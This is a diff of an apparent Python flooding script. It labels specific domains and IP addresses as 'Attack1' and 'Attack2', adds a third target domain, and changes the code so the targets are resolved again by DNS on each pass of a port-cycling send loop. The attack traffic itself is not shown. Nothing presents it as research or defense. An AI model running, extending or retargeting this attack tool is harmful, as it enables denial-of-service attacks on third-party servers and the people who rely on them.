@@ -65,17 +65,23 @@ time.sleep(1)
 
 # Get ip.
 url1 = "fwess.top"
-#ip1 = socket.gethostbyname(url1)
-ip1 = "163.187.32.26"
+ip1 = socket.gethostbyname(url1)
+#ip1 = "163.187.32.26"
 url2 = "ffwecc.top"
-#ip2 = socket.gethostbyname(url2)
-ip2 = "103.215.51.91"
+ip2 = socket.gethostbyname(url2)
+#ip2 = "103.215.51.91"
+url3 = "liwuhe51.top"
+ip3 = socket.gethostbyname(url3)
+#ip2 = "103.82.54.28"
 
 
-#print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url1))
-#print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(url2))
-print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(ip1))
-print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(ip2))
+
+print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url1))
+print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(url2))
+print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(url3))
+#print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(ip1))
+#print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(ip2))
+#print('\033[1;31m/marking "Attack2" <%s>\033[0m'%(ip3))
 time.sleep(1)
 
 # Value.
@@ -100,10 +106,12 @@ if port_mode == False:  # All ports.
                 print('\033[1;36m/wait %s'%(timeR))
                 sent = 1
                 time.sleep(timeR)
-                #ip1 = socket.gethostbyname(url1)
-                #ip2 = socket.gethostbyname(url2)
-                ip1 = "163.187.32.26"
-                ip2 = "103.215.51.91"
+                ip1 = socket.gethostbyname(url1)
+                ip2 = socket.gethostbyname(url2)
+                ip3 = socket.gethostbyname(url3)
+                #ip1 = "163.187.32.26"
+                #ip2 = "103.215.51.91"
+                #ip3 = "103.82.54.28"
 
             elif port == 1900:
                 port = 1901
